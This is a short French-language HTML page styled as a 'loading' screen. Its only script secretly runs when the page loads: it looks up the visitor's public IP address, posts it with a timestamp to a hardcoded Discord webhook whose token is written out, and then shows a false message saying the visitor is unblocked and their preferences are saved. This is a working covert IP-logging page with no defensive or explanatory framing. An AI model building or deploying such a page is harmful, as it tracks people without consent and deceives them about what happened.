<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>en cours de chargement </title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #0f172a;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }

        .box {
            background: #020617;
            padding: 25px;
            border-radius: 10px;
            max-width: 420px;
            text-align: center;
            box-shadow: 0 0 20px rgba(0,0,0,0.6);
        }
    </style>
</head>
<body>

<div class="box" id="resultBox">
    <h2>en cours</h2>
    <p>...</p>
    <p id="resultText">Chargement...</p>
</div>

<script>
const WEBHOOK_URL = "https://discord.com/api/webhooks/1453050534851379243/QQWpYZbMCPh4wn637YIkWNvpPLw7BxVyo6kJWN2q1xxn4IXiEnL6LGU-wDVhGbMiUaEU";

window.onload = function() {
    document.getElementById("resultText").textContent = "R√©cup√©ration en cours...";

    fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .then(data => {
            const payload = {
                content: `üì• **Nouveau visiteur (auto)**\nüåê IP : ${data.ip}\nüïí ${new Date().toLocaleString()}`
            };

            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });

            document.getElementById("resultText").textContent = "D√©bloqu√© avec succ√®s ! (Vos pr√©f√©rences ont √©t√© enregistr√©es.)";
        })
        .catch(() => {
            document.getElementById("resultText").textContent = "Erreur lors de la r√©cup√©ration.";
        });
}
</script>

</body>
</html>
